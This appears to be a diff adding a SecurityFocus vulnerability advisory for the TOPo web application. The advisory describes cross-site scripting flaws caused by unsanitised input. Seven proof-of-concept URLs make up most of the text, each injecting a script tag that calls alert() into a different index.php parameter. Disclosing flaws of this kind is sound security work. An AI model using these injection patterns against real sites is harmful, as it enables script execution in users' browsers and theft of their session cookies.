@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13700/info
+
+TOPo is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/topo/index.php?m=top"><SCRIPT>alert()</script>&s=info&ID=1114815037.2498
+http://www.example.com/topo/index.php?m=top&s=info&ID=1115946293.3552"><SCRIPT>alert()</SCRIPT>&t=puntuar
+http://www.example.com/topo/index.php?m=top&s=info"><script>alert()</script>&ID=1115946293.3552&t=puntuar
+http://www.example.com/topo/index.php?m=top"><script>alert()</script>&s=info&ID=1115946293.3552&t=puntuar
+http://www.example.com/topo/index.php?m=top&s=info&t=comments&ID=1114815037.2498"><SCRIPT>alert()</script>
+http://www.example.com/topo/index.php?m=top&s=info&t=comments&paso=1&ID=1111068112.7598"><SCRIPT>alert()</script>
+http://www.example.com/topo/index.php?m=members&s=html&t=edit"><SCRIPT>alert()</script> 
